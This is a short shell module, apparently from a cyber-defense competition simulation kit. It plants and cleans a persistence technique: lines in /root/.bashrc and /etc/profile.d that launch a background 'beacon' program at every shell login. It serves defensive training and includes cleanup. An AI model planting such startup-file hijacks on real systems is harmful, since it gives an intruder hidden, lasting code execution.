# technique: shell rc / profile.d hijack (guide 3.2)
name="rc-hijack"
plant() {
    grep -q ccdc-sim /root/.bashrc 2>/dev/null || \
        echo 'nohup /usr/local/bin/ccdc-sim-beacon >/dev/null 2>&1 & # ccdc-sim' >> /root/.bashrc
    echo '/usr/local/bin/ccdc-sim-beacon & # ccdc-sim' > /etc/profile.d/ccdc-sim.sh
}
clean() {
    [ -f /root/.bashrc ] && sed -i '/ccdc-sim/d' /root/.bashrc
    rm -f /etc/profile.d/ccdc-sim.sh
}
